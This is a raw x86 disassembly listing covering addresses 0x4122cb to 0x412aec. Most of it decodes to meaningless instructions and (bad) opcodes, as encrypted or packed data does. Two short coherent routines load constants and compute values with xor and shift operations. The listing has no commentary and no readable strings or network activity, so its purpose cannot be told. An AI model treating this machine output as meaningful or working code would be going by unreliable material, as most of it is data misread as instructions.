  4122cb:	outs   dx,DWORD PTR ds:[esi]
  4122cc:	push   ss
  4122cd:	cmp    eax,0x9a57bc33
  4122d2:	mov    es,eax
  4122d4:	stos   DWORD PTR es:[edi],eax
  4122d5:	jle    0x41234f
  4122d7:	mov    ch,0x20
  4122d9:	xor    esp,DWORD PTR [edi+0x4f]
  4122dc:	mov    ebx,0x74f4c31c
  4122e1:	fisub  WORD PTR [ebx+edi*4]
  4122e4:	dec    edi
  4122e5:	out    0x28,al
  4122e7:	adc    dh,dh
  4122e9:	ficomp DWORD PTR [edi+0x141bf165]
  4122ef:	stos   DWORD PTR es:[edi],eax
  4122f0:	ins    DWORD PTR es:[edi],dx
  4122f1:	add    al,0x94
  4122f3:	mov    ecx,0x6989662a
  4122f8:	ror    DWORD PTR [edi+ebp*8],cl
  4122fb:	jge    0x4122f9
  4122fd:	mov    eax,ds:0x650f0334
  412302:	inc    esp
  412303:	add    eax,0x6dd2a399
  412308:	pop    esp
  412309:	mov    ebx,0x117b48b3
  41230e:	mov    edx,0x544270cc
  412313:	fwait
  412314:	or     DWORD PTR [edx],ecx
  412316:	adc    eax,0x13ddede2
  41231b:	cmp    al,BYTE PTR [eax-0xe]
  41231e:	dec    ecx
  41231f:	pop    ebx
  412320:	outs   dx,BYTE PTR ds:[esi]
  412321:	mov    al,ds:0xbb065161
  412326:	jg     0x4122ff
  412328:	mov    eax,ds:0x84cec1e0
  41232d:	(bad)  
  41232e:	stos   DWORD PTR es:[edi],eax
  41232f:	lods   eax,DWORD PTR ds:[esi]
  412330:	aam    0xb6
  412332:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412333:	or     eax,0x366da63e
  412338:	inc    esi
  412339:	and    al,0xc1
  41233b:	in     al,0x66
  41233d:	(bad)  
  41233f:	xchg   ebp,eax
  412340:	not    esp
  412342:	(bad)  
  412343:	mov    al,ds:0xc207eb65
  412348:	push   eax
  412349:	mov    edi,0x3c7e6efe
  41234e:	lods   eax,DWORD PTR ds:[esi]
  41234f:	clc    
  412350:	sub    eax,0xf6192e7e
  412355:	sbb    al,0x2e
  412357:	ja     0x41234b
  412359:	xchg   ebx,eax
  41235a:	sahf   
  41235b:	test   BYTE PTR [ebp+0x14],0x1b
  41235f:	js     0x412364
  412361:	mov    eax,ds:0xadd4ed6f
  412366:	add    BYTE PTR [esi],bl
  412368:	js     0x41237a
  41236a:	fisub  DWORD PTR [edx-0x68720ee5]
  412370:	mov    cl,0x91
  412372:	aam    0xc7
  412374:	or     edx,ebp
  412376:	push   ecx
  412377:	cmp    BYTE PTR [edx+0x1c10303],0x10
  41237e:	xor    eax,0xad127c40
  412383:	xor    dl,BYTE PTR [edx-0x141ebd84]
  412389:	or     ecx,DWORD PTR [edi]
  41238b:	call   0x43c6:0xe5523ecf
  412392:	add    DWORD PTR ds:0x3f9e657b,eax
  412398:	arpl   WORD PTR [edx+0x42],sp
  41239b:	and    edx,DWORD PTR [ebx+0x222cb705]
  4123a1:	jge    0x412410
  4123a3:	shr    BYTE PTR [eax+ecx*4-0x6e],1
  4123a7:	xchg   DWORD PTR [ecx],edi
  4123a9:	or     al,cl
  4123ab:	push   eax
  4123ac:	push   ebx
  4123ad:	sub    eax,0x7ec893ad
  4123b2:	sbb    DWORD PTR [eax+0x6c97778b],ebp
  4123b8:	pusha  
  4123b9:	in     eax,dx
  4123ba:	push   0xb58006fb
  4123bf:	cmp    esp,0xffffff9d
  4123c2:	pusha  
  4123c3:	cdq    
  4123c4:	test   al,0xfb
  4123c6:	mov    ds:0xa594ce4,eax
  4123cc:	mov    edi,0xedd6a05a
  4123d1:	mov    bl,0xfa
  4123d3:	imul   ebp,esp,0xd2784d04
  4123d9:	mov    dl,0x24
  4123db:	aas    
  4123dc:	(bad)  
  4123dd:	adc    eax,0x1c10884f
  4123e2:	loope  0x4123a8
  4123e4:	cmp    DWORD PTR [ebp+0x31],eax
  4123e7:	test   al,cl
  4123e9:	call   FWORD PTR [edx]
  4123eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123ec:	mov    DWORD PTR [eax-0x4165b12a],edx
  4123f2:	add    al,0x87
  4123f4:	aaa    
  4123f5:	lods   eax,DWORD PTR ds:[esi]
  4123f6:	ja     0x41242d
  4123f8:	sub    al,0x46
  4123fa:	dec    ebp
  4123fb:	ss inc edx
  4123fd:	outs   dx,DWORD PTR ds:[esi]
  4123fe:	int3   
  4123ff:	cwde   
  412400:	fimul  DWORD PTR [eax+0x37]
  412403:	in     eax,dx
  412404:	fcomp  DWORD PTR [esi]
  412406:	and    esi,DWORD PTR [edx+ecx*4-0x3ba409d7]
  41240d:	out    dx,al
  41240e:	mov    BYTE PTR [edx],0xd8
  412411:	fucomi st,st(7)
  412413:	mov    ecx,0x6c620dcb
  412418:	jb     0x412480
  41241a:	pop    esi
  41241b:	push   esp
  41241c:	inc    esi
  41241d:	ret    
  41241e:	jg     0x41242e
  412420:	sti    
  412421:	mov    ah,0x29
  412423:	loopne 0x412421
  412425:	xor    eax,DWORD PTR [eax]
  412427:	mov    DWORD PTR ds:0x664a294d,edx
  41242d:	jg     0x41244a
  41242f:	maxps  xmm6,XMMWORD PTR [ebp+0x37e26667]
  412436:	shl    DWORD PTR [ecx+ebp*4-0x1b97aebd],0xf1
  41243e:	cmp    al,0x75
  412440:	mov    edx,0xde2f0fcb
  412445:	int3   
  412446:	imul   ebp,DWORD PTR [edi-0x17],0xdf907c9e
  41244d:	or     eax,0xd3783b49
  412452:	xchg   edi,eax
  412453:	div    BYTE PTR [edi]
  412455:	leave  
  412456:	mov    dh,0xae
  412458:	xchg   esi,eax
  412459:	or     al,0x3a
  41245b:	rcl    DWORD PTR [esi+0x79],0xe5
  41245f:	adc    bh,BYTE PTR [esp+ebp*1-0x80]
  412463:	jecxz  0x4124b2
  412465:	ja     0x412455
  412467:	pop    esp
  412468:	and    edi,DWORD PTR [eax-0x13]
  41246b:	lods   eax,DWORD PTR ds:[esi]
  41246c:	retf   
  41246d:	das    
  41246e:	jge    0x412481
  412470:	xchg   ebp,eax
  412471:	xchg   ebx,eax
  412472:	cmp    ch,ah
  412474:	pop    ss
  412475:	push   ebx
  412476:	sub    al,bl
  412478:	inc    eax
  412479:	or     ah,BYTE PTR [ebp+0x1a96d0d8]
  41247f:	and    esi,eax
  412481:	and    BYTE PTR [edi+0x5c],bl
  412484:	stc    
  412485:	pusha  
  412486:	cmc    
  412487:	ret    
  412488:	push   0xe398a3a9
  41248d:	aaa    
  41248e:	shr    edi,0x24
  412491:	lahf   
  412492:	stos   DWORD PTR es:[edi],eax
  412493:	pop    ebx
  412494:	xor    esp,edi
  412496:	lods   eax,DWORD PTR ds:[esi]
  412497:	mov    al,ds:0x4785a4ba
  41249c:	push   ss
  41249d:	mov    ?,ebp
  41249f:	fsubr  QWORD PTR [ebx]
  4124a1:	push   esi
  4124a2:	sub    DWORD PTR [ecx],edi
  4124a4:	int3   
  4124a5:	xchg   DWORD PTR [edx+0x28c5884c],esi
  4124ab:	retf   0x45d7
  4124ae:	popf   
  4124af:	jb     0x412495
  4124b1:	cmc    
  4124b2:	inc    edi
  4124b3:	pusha  
  4124b4:	xor    BYTE PTR [ecx+0x4059be82],al
  4124ba:	jmp    0x412457
  4124bc:	cmp    bh,BYTE PTR ds:0x370a628d
  4124c2:	call   0x5b5f939a
  4124c7:	out    0x90,eax
  4124c9:	xchg   ecx,eax
  4124ca:	sbb    DWORD PTR [esi+0x58e05754],0xffffffcf
  4124d1:	jns    0x41251c
  4124d3:	cmc    
  4124d4:	xchg   ebx,eax
  4124d5:	test   eax,0xae7ec54e
  4124da:	push   edx
  4124db:	xchg   esi,eax
  4124dc:	sub    al,BYTE PTR [ecx+ecx*8+0x56]
  4124e0:	out    dx,al
  4124e1:	std    
  4124e2:	mov    esp,0x1aeee1e2
  4124e7:	lahf   
  4124e8:	popa   
  4124e9:	push   ecx
  4124ea:	mov    bh,0xb4
  4124ec:	sbb    al,0x83
  4124ee:	ins    DWORD PTR es:[edi],dx
  4124ef:	pop    ss
  4124f0:	es xchg edi,eax
  4124f2:	pusha  
  4124f3:	jmp    0x4124b9
  4124f5:	or     al,0x22
  4124f7:	fwait
  4124f8:	push   cs
  4124f9:	cmp    cl,BYTE PTR [ebx+0x47a01f4a]
  4124ff:	dec    eax
  412500:	fldcw  WORD PTR [edi+0x3af080b]
  412506:	rcl    BYTE PTR [ebx],1
  412508:	icebp  
  412509:	add    edx,0x2313
  41250f:	adc    esi,0x2a00
  412515:	push   esi
  412516:	push   edx
  412517:	call   0x422074
  41251c:	mov    ecx,0x1207
  412521:	sub    ecx,eax
  412523:	push   0x0
  412525:	pop    eax
  412526:	jmp    0x41279b
  41252b:	jae    0x41252c
  41252d:	mov    dl,0xf5
  41252f:	sbb    bl,BYTE PTR [ebx+esi*1-0x74c2fe82]
  412536:	jo     0x4124e0
  412538:	stos   BYTE PTR es:[edi],al
  412539:	mov    ds:0x185c57bc,eax
  41253e:	sbb    BYTE PTR [ecx+0x14],dh
  412541:	sbb    BYTE PTR [eax],bl
  412543:	sbb    DWORD PTR [ecx+0x1fa2e148],0x812d5fcb
  41254d:	mov    ch,0x94
  41254f:	add    al,0x47
  412551:	xchg   BYTE PTR [esi],cl
  412553:	shr    BYTE PTR [eax+0x47f35166],1
  412559:	leave  
  41255a:	(bad)  
  41255b:	inc    ebp
  41255c:	test   al,0xc2
  41255e:	mov    eax,0xe5bd5b5e
  412563:	lea    esp,[ecx+0x384fa106]
  412569:	xor    eax,0xfff80d4d
  41256e:	pusha  
  41256f:	push   0x57
  412571:	ror    bh,1
  412573:	pop    ebp
  412574:	js     0x412597
  412576:	push   0xffffffe9
  412578:	stos   BYTE PTR es:[edi],al
  412579:	je     0x412586
  41257b:	lods   al,BYTE PTR ds:[esi]
  41257c:	or     eax,0xbc430ce8
  412581:	mov    ch,0x51
  412583:	sbb    ch,BYTE PTR [eax+0xa]
  412586:	sahf   
  412587:	add    al,0x33
  412589:	outs   dx,DWORD PTR ds:[esi]
  41258a:	or     BYTE PTR [edi+0x2a],0x69
  41258e:	add    eax,0xa922d64a
  412593:	mov    edx,0xbc5a502d
  412598:	sub    BYTE PTR [ecx+0x3a],ch
  41259b:	pushf  
  41259c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41259d:	jo     0x41256c
  41259f:	or     dh,BYTE PTR [edi+0x61]
  4125a2:	and    DWORD PTR [ebp-0x3b8b5754],esp
  4125a8:	pop    ebx
  4125a9:	ja     0x41255d
  4125ab:	leave  
  4125ac:	adc    ecx,DWORD PTR [ebx]
  4125ae:	inc    ebx
  4125af:	adc    bl,BYTE PTR [edi+0x528a68ce]
  4125b5:	xchg   ecx,eax
  4125b6:	pop    ss
  4125b7:	mov    bl,0x52
  4125b9:	std    
  4125ba:	pop    ds
  4125bb:	xchg   ebp,eax
  4125bc:	(bad)  
  4125bd:	push   ebx
  4125be:	push   ds
  4125bf:	jmp    0xae1b:0xc1bd160b
  4125c6:	mov    dl,0xbe
  4125c8:	shl    DWORD PTR [edx+0x2693ddbb],1
  4125ce:	adc    esi,DWORD PTR [eax-0x52cb3262]
  4125d4:	mov    ah,0xaa
  4125d6:	jbe    0x412580
  4125d8:	add    al,0xcf
  4125da:	lds    ebx,FWORD PTR [ebp-0x133b5686]
  4125e0:	mov    ecx,0xc4346637
  4125e5:	clc    
  4125e6:	inc    esp
  4125e7:	push   ecx
  4125e8:	jp     0x4125c3
  4125ea:	inc    ebp
  4125eb:	jae    0x41264c
  4125ed:	adc    BYTE PTR [eax+ecx*1-0x21c93eec],ah
  4125f4:	and    eax,0xe1a1242f
  4125f9:	adc    edx,ebx
  4125fb:	pop    ds
  4125fc:	push   ss
  4125fd:	pop    esi
  4125fe:	and    ebp,DWORD PTR [esi-0x29]
  412601:	lea    ebp,[ebp-0x40]
  412604:	dec    ebx
  412605:	sub    DWORD PTR [edx],0xffffffd3
  412608:	lods   eax,DWORD PTR ds:[esi]
  412609:	rcl    DWORD PTR [edi-0xf71defd],1
  41260f:	outs   dx,DWORD PTR ds:[esi]
  412610:	shl    DWORD PTR [edx-0x50],1
  412613:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412614:	adc    ebp,esi
  412616:	push   edi
  412617:	ins    BYTE PTR es:[edi],dx
  412618:	cs or  al,0x5d
  41261b:	dec    esi
  41261c:	test   al,0x89
  41261e:	mov    ds:0x2a3d1af9,eax
  412623:	mov    esi,0x19094e92
  412628:	xchg   ecx,eax
  412629:	mov    ds:0xf462f02b,al
  41262e:	jne    0x412675
  412630:	xor    bl,BYTE PTR [ebx-0x23ff135c]
  412636:	jbe    0x4126b4
  412638:	cmp    eax,0x37edda5c
  41263d:	xchg   ebp,eax
  41263e:	test   ebp,0x466681c1
  412644:	ret    0x9268
  412647:	int    0x50
  412649:	push   ebx
  41264a:	lds    edx,FWORD PTR [ebx]
  41264c:	mov    bl,0x26
  41264e:	(bad)  
  41264f:	imul   DWORD PTR [eax-0x62]
  412652:	push   edx
  412653:	popa   
  412654:	or     bh,BYTE PTR [ecx+0x60]
  412657:	ja     0x41264e
  412659:	or     al,0xd7
  41265b:	push   es
  41265c:	or     BYTE PTR [edx+0x4c],dl
  41265f:	(bad)  
  412660:	out    0xf9,al
  412662:	retf   0xc4c1
  412665:	inc    edi
  412666:	mov    bh,0xa2
  412668:	cs (bad) 
  41266a:	clc    
  41266b:	add    DWORD PTR [esi],ebx
  41266d:	in     al,dx
  41266e:	ss dec esi
  412670:	inc    edi
  412671:	in     al,0xfb
  412673:	jns    0x41267d
  412675:	push   0x9
  412677:	in     eax,dx
  412678:	and    al,BYTE PTR [edx+0x2b]
  41267b:	stos   DWORD PTR es:[edi],eax
  41267c:	xor    DWORD PTR [esi-0x6a],0x79
  412680:	iret   
  412681:	xchg   esp,eax
  412682:	jns    0x412692
  412684:	mov    dh,0x54
  412686:	outs   dx,BYTE PTR ds:[esi]
  412687:	push   ebp
  412688:	sbb    eax,0x797e5a35
  41268d:	xchg   edx,eax
  41268e:	data16 sahf 
  412690:	xor    DWORD PTR [edx+0x37],ebp
  412693:	pop    esp
  412694:	mov    BYTE PTR [ebp-0x43],bl
  412697:	jns    0x4126c6
  412699:	or     BYTE PTR ds:[ebx-0x3a],dl
  41269d:	ficom  DWORD PTR [esi]
  41269f:	and    al,0x94
  4126a1:	cmp    DWORD PTR [edi+0x3a],edx
  4126a4:	pop    edx
  4126a5:	mov    dh,0x15
  4126a7:	or     DWORD PTR [ecx-0x23f301df],0x86b429b4
  4126b1:	sub    bl,bh
  4126b3:	in     al,dx
  4126b4:	out    dx,eax
  4126b5:	inc    eax
  4126b6:	dec    edi
  4126b7:	je     0x4126e4
  4126b9:	rep lods al,BYTE PTR ds:[esi]
  4126bb:	jge    0x412737
  4126bd:	pop    edx
  4126be:	out    0x37,eax
  4126c0:	or     BYTE PTR [ebp+0x3a0ee6],dh
  4126c6:	sbb    dh,BYTE PTR [eax+0xc5a27e6]
  4126cc:	mov    dl,0x33
  4126ce:	cmp    eax,0xb7ed63f5
  4126d3:	mov    ecx,0x8df3a1f7
  4126d8:	mov    ch,0x27
  4126db:	xchg   ebx,eax
  4126dc:	fbstp  TBYTE PTR [esi+0x2b42bcf5]
  4126e2:	jno    0x4126c8
  4126e4:	int3   
  4126e5:	daa    
  4126e6:	sub    cl,bh
  4126e8:	sti    
  4126e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126ea:	cmp    BYTE PTR [eax-0x52],cl
  4126ed:	jne    0x412718
  4126ef:	rcl    DWORD PTR [esi+0x4f],0x49
  4126f3:	nop
  4126f4:	adc    al,0xaa
  4126f6:	lahf   
  4126f7:	mov    al,0x32
  4126f9:	pop    ss
  4126fa:	pop    esp
  4126fb:	push   edi
  4126fc:	ficomp DWORD PTR [eax]
  4126fe:	push   esi
  4126ff:	mov    eax,0x95f1a62b
  412704:	push   eax
  412705:	xchg   edx,eax
  412706:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412707:	stos   DWORD PTR es:[edi],eax
  412708:	mov    ebp,DWORD PTR [esp+esi*8]
  41270b:	jecxz  0x412732
  41270d:	es pop edx
  41270f:	pop    edi
  412710:	stos   BYTE PTR es:[edi],al
  412711:	test   BYTE PTR [ebx-0x61eaa1a8],dh
  412717:	mov    eax,0xacf3fdc2
  41271c:	ss sbb eax,0x4731da9e
  412722:	popf   
  412723:	sub    edx,0x27
  412726:	sbb    edi,DWORD PTR [edx+ebx*2+0x3e]
  41272a:	fimul  WORD PTR [ebx-0x74211507]
  412730:	dec    eax
  412731:	mov    ds:0xb8a75242,eax
  412736:	sub    BYTE PTR [edi],al
  412738:	(bad)  
  412739:	lock pop eax
  41273b:	pop    es
  41273c:	cdq    
  41273d:	cmp    eax,0x930e466c
  412742:	push   esp
  412743:	jg     0x4127a2
  412745:	sub    al,0x68
  412747:	cmp    ch,dl
  412749:	mov    al,ds:0x8e0c17f0
  41274e:	xor    edx,edi
  412750:	sbb    eax,0x27b75d2e
  412755:	stc    
  412756:	popa   
  412757:	ja     0x412781
  412759:	cld    
  41275a:	aam    0x21
  41275c:	mov    edi,0x58ac6a6b
  412761:	inc    edi
  412762:	xor    BYTE PTR [edx-0x54fd8cbd],ch
  412768:	shl    BYTE PTR [esi+eiz*1+0x3],1
  41276c:	sub    BYTE PTR [ebx+0x7afe1eb6],cl
  412772:	out    dx,eax
  412773:	(bad)  [eax+0x5]
  412776:	push   0xc609217b
  41277b:	pop    eax
  41277c:	(bad)  
  41277d:	in     al,0x24
  41277f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412780:	mov    ebx,0xeb03ba9c
  412785:	push   esp
  412786:	jmp    0x999e1203
  41278b:	or     al,0x5c
  41278d:	or     BYTE PTR [esi+0x7eeebd8d],ch
  412793:	inc    edx
  412794:	mov    al,ds:0x8eb0a44
  412799:	xchg   ebp,eax
  41279a:	and    BYTE PTR [ebx],bl
  41279c:	ret    0x158b
  41279f:	cld    
  4127a0:	and    eax,0xf6330042
  4127a5:	cmp    edx,ecx
  4127a7:	jne    0x4127da
  4127ad:	cmp    esi,eax
  4127af:	jne    0x4127da
  4127b5:	mov    eax,DWORD PTR [ebp-0x4]
  4127b8:	mov    ecx,DWORD PTR [ebp-0x8]
  4127bb:	add    eax,0x4296
  4127c0:	shr    eax,0x2
  4127c3:	or     eax,ecx
  4127c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4127c8:	xor    eax,ecx
  4127ca:	xor    eax,0x4e94
  4127cf:	add    eax,DWORD PTR ds:0x4225fc
  4127d5:	mov    ds:0x422604,eax
  4127da:	pop    esi
  4127db:	leave  
  4127dc:	ret    0x4
  4127df:	push   ebp
  4127e0:	mov    ebp,esp
  4127e2:	sub    esp,0x58
  4127e5:	push   ebx
  4127e6:	push   esi
  4127e7:	push   edi
  4127e8:	mov    DWORD PTR [ebp-0x58],0x3082
  4127ef:	mov    DWORD PTR [ebp-0x54],0x37a2
  4127f6:	mov    DWORD PTR [ebp-0x50],0x49d6
  4127fd:	mov    DWORD PTR [ebp-0x4c],0x6390
  412804:	mov    DWORD PTR [ebp-0x48],0x40f2
  41280b:	mov    DWORD PTR [ebp-0x44],0x21d4
  412812:	mov    DWORD PTR [ebp-0x28],0x4726
  412819:	mov    DWORD PTR [ebp-0x24],0x221a
  412820:	mov    DWORD PTR [ebp-0x30],0x768c
  412827:	mov    DWORD PTR [ebp-0x2c],0x29e8
  41282e:	mov    DWORD PTR [ebp-0x40],0x6cf6
  412835:	mov    DWORD PTR [ebp-0x3c],0x94c
  41283c:	mov    DWORD PTR [ebp-0x38],0x4797
  412843:	mov    DWORD PTR [ebp-0x34],0x4439
  41284a:	mov    DWORD PTR [ebp-0x20],0x2531
  412851:	mov    esi,0x5a3e
  412856:	mov    DWORD PTR [ebp-0x1c],esi
  412859:	mov    DWORD PTR [ebp-0x18],0x2e83e7a
  412860:	mov    DWORD PTR [ebp-0x14],0x7
  412867:	mov    DWORD PTR [ebp-0x10],0xe3a
  41286e:	mov    DWORD PTR [ebp-0xc],0x6a6e
  412875:	mov    DWORD PTR [ebp-0x8],0x6b99
  41287c:	mov    DWORD PTR [ebp-0x4],0x2acd
  412883:	mov    eax,DWORD PTR [ebp-0x10]
  412886:	mov    ecx,DWORD PTR [ebp-0xc]
  412889:	mov    eax,DWORD PTR [ebp-0x8]
  41288c:	mov    ecx,DWORD PTR [ebp-0x4]
  41288f:	mov    eax,DWORD PTR [ebp-0x18]
  412892:	mov    ecx,DWORD PTR [ebp-0x14]
  412895:	jmp    0x412c6d
  41289a:	icebp  
  41289b:	not    esi
  41289d:	xchg   ecx,eax
  41289e:	into   
  41289f:	xor    DWORD PTR [esi],ebp
  4128a1:	jbe    0x4128b2
  4128a3:	cmc    
  4128a4:	gs mov esp,0xbcd5fcc5
  4128aa:	scas   al,BYTE PTR es:[edi]
  4128ab:	pop    eax
  4128ac:	sbb    BYTE PTR [eax],bl
  4128ae:	stos   BYTE PTR es:[edi],al
  4128af:	adc    bl,BYTE PTR [eax]
  4128b1:	sbb    BYTE PTR [eax],dl
  4128b3:	int3   
  4128b4:	std    
  4128b5:	loope  0x4128a6
  4128b7:	jecxz  0x412911
  4128b9:	fsub   DWORD PTR [ecx]
  4128bc:	inc    eax
  4128bd:	add    al,0xe3
  4128bf:	pop    esi
  4128c0:	(bad)  
  4128c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128c2:	push   edi
  4128c3:	or     dl,BYTE PTR ds:0x4b6f07aa
  4128c9:	adc    DWORD PTR [esi],0x83b12f9
  4128cf:	mov    eax,0x2bb6ba1d
  4128d4:	icebp  
  4128d5:	das    
  4128d6:	adc    eax,0x8e84d1a4
  4128db:	push   ecx
  4128dc:	adc    ch,dl
  4128de:	xchg   ecx,eax
  4128df:	jae    0x41289e
  4128e1:	loope  0x4128c4
  4128e3:	and    BYTE PTR [edi+0x4f],al
  4128e6:	adc    DWORD PTR [ebp+0x7d],ebp
  4128e9:	clc    
  4128ea:	and    eax,0xab96f29b
  4128ef:	add    DWORD PTR [esi-0x2a],edi
  4128f2:	sar    DWORD PTR [ebp+0x0],cl
  4128f5:	mov    edi,0x274e3a15
  4128fa:	mov    BYTE PTR [edi],al
  4128fc:	rcr    BYTE PTR [edx],1
  4128fe:	sub    ah,BYTE PTR [ebp+0xc26c0ea]
  412904:	test   BYTE PTR [ecx],dl
  412906:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412907:	mov    dh,0x88
  412909:	mov    dh,0xa4
  41290b:	and    esp,0xf7df4cec
  412911:	cmp    al,0xde
  412913:	aaa    
  412914:	inc    ecx
  412915:	psubusb mm7,mm4
  412918:	fsubr  st(4),st
  41291a:	mov    al,BYTE PTR [ebx+0x26a867b8]
  412920:	pop    ds
  412921:	xchg   BYTE PTR [edi-0x76],bh
  412924:	scas   al,BYTE PTR es:[edi]
  412925:	add    eax,0x5fa8faf1
  41292a:	push   ebp
  41292b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41292c:	xchg   edx,eax
  41292d:	not    esp
  41292f:	(bad)  
  412931:	(bad)  [ebp-0xc553c65]
  412937:	jg     0x4128cd
  412939:	mov    WORD PTR [edi+0x3e],gs
  41293c:	jne    0x412951
  41293e:	adc    al,BYTE PTR [edx+0x74]
  412941:	sub    al,0x23
  412943:	js     0x412965
  412945:	out    dx,eax
  412946:	cmp    ah,BYTE PTR [ecx]
  412948:	dec    ebp
  412949:	imul   esi,eax,0x8884f0ec
  41294f:	outs   dx,BYTE PTR ds:[esi]
  412950:	sub    DWORD PTR [edi+0x431daeca],ebp
  412956:	xchg   ebp,eax
  412957:	dec    edi
  412958:	push   ecx
  412959:	ss jae 0x412925
  41295c:	push   ecx
  41295d:	xchg   ebx,eax
  41295e:	adc    ebx,DWORD PTR [edi+0x7f]
  412961:	repnz dec edx
  412963:	cmp    BYTE PTR [eax],0x8c
  412966:	cdq    
  412967:	add    al,0x29
  412969:	shl    BYTE PTR [ebx+0x13239750],0x28
  412970:	stc    
  412971:	cmp    ah,ah
  412973:	jle    0x412988
  412975:	mov    BYTE PTR [ebx-0x67846413],ch
  41297b:	jg     0x41298d
  41297d:	pop    esi
  41297e:	cdq    
  41297f:	sbb    al,0x4b
  412981:	pop    ebp
  412982:	dec    ebp
  412983:	push   ebx
  412984:	add    eax,0xbbf3662a
  412989:	dec    ecx
  41298a:	push   0x58
  41298c:	cld    
  41298d:	or     BYTE PTR [esi],0x44
  412990:	sbb    dl,BYTE PTR [ebp-0x72]
  412993:	out    dx,al
  412994:	inc    ebx
  412995:	adc    BYTE PTR [edi],cl
  412997:	dec    edx
  412998:	(bad)  
  412999:	test   al,0x1e
  41299b:	push   ss
  41299c:	dec    esp
  41299d:	mov    eax,ds:0xf9330d89
  4129a2:	adc    al,0x91
  4129a4:	xor    eax,eax
  4129a6:	jno    0x412956
  4129a8:	inc    esp
  4129a9:	xchg   ebp,eax
  4129aa:	das    
  4129ab:	mov    esp,0x1c5ef9e6
  4129b0:	adc    DWORD PTR [edi+0x56e49d30],esp
  4129b6:	(bad)  
  4129b7:	ins    DWORD PTR es:[edi],dx
  4129b8:	mov    bl,0xc6
  4129ba:	pop    esp
  4129bb:	hlt    
  4129bc:	pushf  
  4129bd:	dec    eax
  4129be:	test   eax,0xc1bcd054
  4129c3:	out    0x2,al
  4129c5:	fcmovb st,st(7)
  4129c7:	mov    ds:0xace2d2dc,al
  4129cc:	sub    eax,0xbcd7d405
  4129d1:	inc    esp
  4129d2:	fs or  al,0x55
  4129d5:	js     0x412963
  4129d7:	or     al,0x61
  4129d9:	in     eax,dx
  4129da:	cmp    al,0x6f
  4129dc:	add    DWORD PTR [edi-0x63],eax
  4129df:	in     al,0x33
  4129e1:	xchg   BYTE PTR [edi],dl
  4129e3:	jecxz  0x412a33
  4129e5:	retf   0x18b0
  4129e8:	sbb    cl,BYTE PTR [ebp+0x1baaa69a]
  4129ee:	inc    eax
  4129ef:	xchg   esp,eax
  4129f0:	fcmovnb st,st(3)
  4129f2:	jmp    0xeaa6:0xeba7de53
  4129f9:	mov    edi,0x5e720894
  4129fe:	mov    edi,0x4d062321
  412a03:	push   cs
  412a04:	sub    al,0x7c
  412a06:	fs cmc 
  412a08:	leave  
  412a09:	mov    cl,0x26
  412a0b:	and    eax,0x30728960
  412a10:	lods   al,BYTE PTR ds:[esi]
  412a11:	fstp   TBYTE PTR [edx+0x38c24bb2]
  412a17:	jo     0x412a05
  412a19:	mov    esp,0xf5f43fce
  412a1e:	(bad)  
  412a1f:	fcmovbe st,st(0)
  412a21:	outs   dx,DWORD PTR ds:[esi]
  412a22:	cmp    eax,0x3e8a5cde
  412a27:	setp   BYTE PTR [eax-0x2b]
  412a2b:	es je  0x412a8c
  412a2e:	sti    
  412a2f:	loop   0x412a5c
  412a31:	sti    
  412a32:	mov    ds:0x4d0001c9,eax
  412a37:	add    DWORD PTR [esp+ebp*1+0x7a],0x36
  412a3c:	mov    al,0x8e
  412a3e:	nop
  412a3f:	mov    bh,0x5b
  412a41:	out    dx,al
  412a42:	inc    edi
  412a43:	jmp    0x4129e8
  412a45:	sub    edx,ebx
  412a47:	and    ebx,esp
  412a49:	fimul  DWORD PTR [edi-0x44]
  412a4c:	jle    0x412a1d
  412a4e:	out    0x28,al
  412a50:	mov    al,0xc7
  412a52:	or     ebx,DWORD PTR [ebx+ecx*4]
  412a55:	fninit 
  412a57:	shr    DWORD PTR [ebx+0x5f],1
  412a5a:	sbb    BYTE PTR [edi-0x10dd4df0],0x13
  412a61:	bound  esi,QWORD PTR [esi+ebx*2+0xa546a1]
  412a68:	dec    ebp
  412a69:	mov    ebp,DWORD PTR [eax+0x30133015]
  412a6f:	outs   dx,BYTE PTR ds:[esi]
  412a70:	nop
  412a71:	mov    bl,0x76
  412a73:	or     esi,DWORD PTR [ecx]
  412a75:	push   cs
  412a76:	(bad)  
  412a77:	in     eax,0x61
  412a79:	xchg   edi,eax
  412a7a:	(bad)  
  412a7b:	loopne 0x412a97
  412a7d:	cmp    DWORD PTR [ebx],esp
  412a7f:	jmp    0x85f75ee0
  412a84:	bnd js 0x412ae9
  412a87:	mov    edi,0x3aa1b8f
  412a8c:	ret    
  412a8d:	test   DWORD PTR [edx+0x112d6c70],0xb916b555
  412a97:	push   ebp
  412a98:	xor    al,0x35
  412a9a:	test   eax,0xe998bfd3
  412a9f:	lock das 
  412aa1:	sbb    DWORD PTR [esp+esi*8+0xd],0xffffff85
  412aa6:	ret    0xfb96
  412aa9:	jecxz  0x412a48
  412aab:	or     ecx,ebx
  412aad:	jnp    0x412a32
  412aaf:	test   DWORD PTR [esi+0x53],0x9eaeb903
  412ab6:	sbb    esi,DWORD PTR [eax]
  412ab8:	stos   BYTE PTR es:[edi],al
  412ab9:	jg     0x412a47
  412abb:	lods   eax,DWORD PTR ds:[esi]
  412abc:	and    BYTE PTR [eax],ah
  412abe:	cdq    
  412abf:	int    0x60
  412ac1:	xchg   esi,eax
  412ac2:	call   0x26a6:0x237561e4
  412ac9:	pop    ecx
  412aca:	into   
  412acb:	ins    BYTE PTR es:[edi],dx
  412acc:	or     BYTE PTR [ecx],cl
  412ace:	fst    QWORD PTR [ebp-0x36]
  412ad1:	retf   
  412ad2:	les    ebp,FWORD PTR [esi-0x2fc4e8f1]
  412ad8:	pushf  
  412ad9:	push   esp
  412ada:	pop    edx
  412adb:	das    
  412adc:	scas   eax,DWORD PTR es:[edi]
  412add:	mov    bh,cl
  412adf:	call   0xb1a1bc1e
  412ae4:	add    eax,0xdec4828b
  412ae9:	ds popa 
  412aeb:	(bad)  
  412aec:	mov    dl,0xee
